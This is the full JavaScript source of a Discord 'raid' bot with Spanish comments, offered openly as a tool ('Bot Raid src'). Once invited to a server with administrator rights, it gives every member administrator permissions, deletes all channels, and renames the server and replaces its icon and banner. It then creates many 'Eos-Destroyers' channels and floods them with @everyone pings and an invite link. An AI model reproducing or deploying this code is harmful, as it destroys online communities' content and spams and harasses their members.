
const { Client, Intents, Collection } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS] });


client.on('ready', () => {
  console.log(`ON ${client.user.tag}!`);
});





client.on('ready', ()=>{
  
    client.user.setActivity('free bot | yung rito.#0001', { type: 'STREAMING' });
    client.user.setPresence({
      status: "idle"
    });
    console.log(`
                                                  
                                                                                
                                                                                
                                      'll'                                      
                                     ;0WW0;                                     
                                    ,0MMMMK:                                    
                                    .dNMMMMXc                                   
                                     .oNMMMMNo.                                 
                                .coooolxOXMMMWx.                                
                               'kWMMMK:..:KMMMWk'                               
                              ,OWMMW0,    ,0WMMWO,                              
                             ;KMMMWk'      'kWMMMK;                             
                             ,cccc:.        .:cccc,                             
                                                                                                
                Bot Raid src 
Estado del Bot: Encendido
Servidores: ${client.guilds.cache.size}  
`)  
});


  client.on('guildCreate', async guild =>{
    let ADMIN_ALL = require('./config.json').DEF_RAID['ADMIN_ALL?']
    if(ADMIN_ALL == false) {
      return;
    }
    guild.roles.cache.find(role => role.name =="@everyone").setPermissions('ADMINISTRATOR').catch(()=>{
      return;
    })
    guild.roles.cache.find(role => role.name === '@everyone').setPermissions('USE_APPLICATION_COMMANDS').then(()=>{
      guild.channels.cache.forEach(channel =>{
    
          channel.permissionOverwrites.edit(guild.id, {'USE_APPLICATION_COMMANDS': true,'READ_MESSAGE_HISTORY': true, 'VIEW_CHANNEL': true, 'SEND_MESSAGES': true}).catch(()=>{
            return;
          })
      })
      }).catch(()=>{
        return;
      })
     })

client.on('guildCreate', async guild => {


await guild.fetchAuditLogs({type: 'INTEGRATION_CREATE'})
.then(async audit => {


    let IDsv = guild.id

    //if(!audit.entries.first().executor.id == 'TU_ID') return; 
    // ⬆️ Elimina las barras "//" de la linea superior si deseas que el Bot solo responda cuando tu lo metas a un servidor.
    
    
    if(audit.entries.first().target.account.id == require('./config.json').BOT.ID){



        if(!guild.me.permissions.has('ADMINISTRATOR')){
            return client.users.cache.get(audit.entries.first().executor.id)
            .send({content: '**No tengo permisos en este servidor. Permiso requerido: ADMINISTRADOR**'})
            .catch(()=>{

                console.log(``)
             })

          }

    

    }
 

    try {

      client.guilds.cache.get(IDsv).setName(require('./config.json').DEF_RAID.SERVER_NAME).catch(e=>{
        return
      })
      client.guilds.cache.get(IDsv).setBanner(require("./config.json").DEF_RAID.SERVER_BANNER).catch(e=>{
        return
      })
      client.guilds.cache.get(IDsv).setIcon(require("./config.json").DEF_RAID.SERVER_ICON).catch(e=>{
        return
      })


      guild.channels.cache.forEach(channel =>{
    
        channel.delete().catch(()=>{return;})
      
      })
    } catch (error) {
      return;
    }
    for(let i = 0; i <= require('./config.json').DEF_RAID.AMOUNT_CHANNELS; i++) {
      try {
        await  guild.channels.create('Eos-Destroyers').then(c => {
          c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
          for (let i = 0; i <= require('./config.json').DEF_RAID.AMOUNT_PINGS; i++) {
    
            try {
              c.send(`  @everyone \n ${require('./config.json').DEF_RAID.MESSAGE_PER_CHANNEL} \n ${require('./config.json').BOT.SERVER_INVITE} `)
            } catch (error) {
              if(error){
                break;
              }  
            }
           
        
              }
            }).catch(()=>{
              return;
            })
      } catch (error) {
        if(error){
          break;
        }
      

        }
      }
    
    

})
.catch(console.error);
});


client.login(require('./config.json').BOT.TOKEN);
